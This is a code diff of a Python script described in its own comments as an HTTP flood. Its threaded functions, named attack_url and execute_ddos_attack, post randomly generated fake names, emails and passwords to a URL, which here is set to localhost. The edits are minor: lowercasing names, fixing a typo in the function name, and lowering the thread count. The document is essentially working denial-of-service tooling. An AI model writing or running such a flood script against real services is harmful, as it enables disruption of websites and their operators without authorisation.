@@ -7,8 +7,8 @@ from threading import Thread
 
 # Constants
 URL = 'http://localhost/api/core/data'
-FIRST_NAMES = tuple(json.load(open('first_names.json')))
-LAST_NAMES = tuple(json.load(open('last_names.json')))
+FIRST_NAMES = tuple(first_name.lower() for first_name in json.load(open('first_names.json')))
+LAST_NAMES = tuple(last_name.lower() for last_name in json.load(open('last_names.json')))
 EMAIL_PROVIDERS = ('gmail.com', 'yahoo.com', 'aol.com', 'outlook.com', 'icloud.com')
 CHARS = string.ascii_letters + string.digits + '!@#$%&'
 
@@ -17,8 +17,8 @@ CHARS = string.ascii_letters + string.digits + '!@#$%&'
 def attack_url():
     for _ in range(100):
         # Randomly generate a fake username and password
-        first_name = random.choice(FIRST_NAMES).lower()
-        last_name = random.choice(LAST_NAMES).lower()
+        first_name = random.choice(FIRST_NAMES)
+        last_name = random.choice(LAST_NAMES)
         extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
         email = random.choice(EMAIL_PROVIDERS)
 
@@ -42,9 +42,9 @@ def attack_url():
 
 
 # Sets up and executes the HTTP flood against the URL
-def execute_ddoss_attack():
+def execute_ddos_attack():
     # Use threading to speed up the number of posts made
-    threads = [Thread(target=attack_url, daemon=True) for _ in range(100)]
+    threads = [Thread(target=attack_url, daemon=True) for _ in range(10)]
     
     # Destroy them!
     for thread in threads:
@@ -57,4 +57,4 @@ def execute_ddoss_attack():
 
 # Execute the program if the script is run directly
 if __name__ == '__main__':
-    execute_ddoss_attack()
+    execute_ddos_attack()
